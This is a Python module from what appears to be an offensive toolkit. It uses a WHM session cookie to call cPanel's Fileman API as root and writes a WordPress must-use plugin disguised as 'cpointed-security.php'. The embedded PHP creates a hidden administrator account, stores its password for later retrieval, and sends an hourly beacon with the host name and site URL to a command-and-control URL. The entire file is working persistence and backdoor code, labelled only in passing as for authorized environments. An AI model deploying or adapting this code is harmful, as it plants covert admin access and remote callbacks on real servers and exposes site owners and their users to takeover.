# Made by Sn0w8ird

"""Deploy a persistent mu-plugin via WHM Fileman (authorized environments only)."""

from __future__ import annotations

import urllib.parse
from typing import Any, Dict, Optional

from cpointed.core.payload_hooks import PayloadHook
from cpointed.core.session import CPointedClient
from cpointed.persistence.wordpress.mu_plugin import MuPluginPersistence

MuPluginBackdoor = MuPluginPersistence


async def deploy_mu_plugin(
    client: CPointedClient,
    session: str,
    wp_root_path: str,
    payload_hook: Optional[Dict[str, Any]] = None,
    *,
    timeout: float = 60.0,
) -> bool:
    """Write mu-plugin PHP under ``wp_root_path`` using WHM session cookie ``whostmgrsession``."""
    ph = payload_hook or {}
    ctx: Dict[str, Any] = dict(ph.get("context") or {})
    mu_dir = f"{wp_root_path.rstrip('/')}/wp-content/mu-plugins"
    backdoor_file = f"{mu_dir}/cpointed-security.php"

    php_code: str
    if ph.get("type") == "file_path" and ph.get("source"):
        php_code = PayloadHook.load_payload(str(ph["source"]), ctx)
    else:
        c2_url = ctx.get("c2_url", "http://127.0.0.1:8080/beacon")
        admin_username = ctx.get("admin_user", "cpointed_support")
        admin_email = ctx.get("admin_email", "support@cpointed.local")
        php_code = f"""<?php
// cpointed persistence – mu-plugin backdoor
// Made by Sn0w8ird
if (!defined('ABSPATH')) exit;

// Create hidden admin if not exists
function cpointed_create_admin() {{
    $username = '{admin_username}';
    $password = wp_generate_password(16, true, true);
    $email = '{admin_email}';
    if (!username_exists($username)) {{
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        // Store password for retrieval
        update_option('cpointed_admin_pass', $password);
    }}
}}
add_action('init', 'cpointed_create_admin');

// C2 beacon every hour
function cpointed_beacon() {{
    wp_remote_post('{c2_url}', array(
        'timeout' => 5,
        'blocking' => false,
        'body' => array('host' => php_uname('n'), 'site' => home_url())
    ));
}}
if (!wp_next_scheduled('cpointed_cron_hook')) {{
    wp_schedule_event(time(), 'hourly', 'cpointed_cron_hook');
}}
add_action('cpointed_cron_hook', 'cpointed_beacon');
?>
"""

    mkdir_path = (
        "/json-api/cpanel?cpanel_jsonapi_user=root&cpanel_jsonapi_apiversion=2"
        "&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=mkdir"
        f"&path={urllib.parse.quote(mu_dir, safe='')}"
    )
    await client.request(
        "GET",
        mkdir_path,
        headers={"Cookie": f"whostmgrsession={session}"},
        timeout=timeout,
    )
    encoded = urllib.parse.quote(php_code, safe="")
    save_path = (
        "/json-api/cpanel?cpanel_jsonapi_user=root&cpanel_jsonapi_apiversion=2"
        "&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile"
        f"&path={urllib.parse.quote(backdoor_file, safe='')}&content={encoded}"
    )
    resp = await client.request(
        "GET",
        save_path,
        headers={"Cookie": f"whostmgrsession={session}"},
        timeout=timeout,
    )
    return resp.status_code == 200


__all__ = ["MuPluginBackdoor", "MuPluginPersistence", "deploy_mu_plugin"]
